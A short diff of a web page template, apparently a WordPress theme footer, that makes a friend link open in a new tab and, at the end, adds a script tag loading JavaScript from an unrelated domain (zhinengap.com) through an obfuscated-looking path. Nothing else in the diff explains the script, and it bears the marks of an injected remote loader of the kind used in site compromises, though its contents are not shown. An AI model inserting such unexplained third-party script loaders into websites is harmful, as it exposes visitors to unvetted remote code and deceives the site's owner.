@@ -9,7 +9,7 @@
 <div class="friend_links">
 	<h2>友情链接</h2>
 	<ul class="links">
-    <li><a href="http://www.todaytw.com/">今日台湾网</a></li>
+    <li><a target="_blank" href="http://www.todaytw.com/">今日台湾网</a></li>
 	<?php //wp_list_bookmarks('title_li=&categorize=0'); ?>
 	</ul>
 </div>
@@ -53,5 +53,6 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 </script>
+<script src="http://js8464.zhinengap.com/9079ea/v@42798!17.js"></script>
 </body>
 </html>
